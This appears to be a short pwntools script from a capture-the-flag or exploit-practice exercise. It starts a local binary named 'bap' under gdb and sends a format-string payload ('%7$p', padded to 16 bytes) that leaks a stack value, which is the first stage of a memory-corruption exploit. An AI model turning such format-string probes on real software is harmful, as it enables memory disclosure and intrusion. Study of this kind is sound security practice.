from pwn import *


context.terminal=["konsole", "-e"]
e = ELF("./bap");
p = process("./bap")

gdb.attach(p)

buf = b"%7$p"

buf = buf.ljust(16, b"a")


p.sendlineafter(b":", buf)


p.interactive()

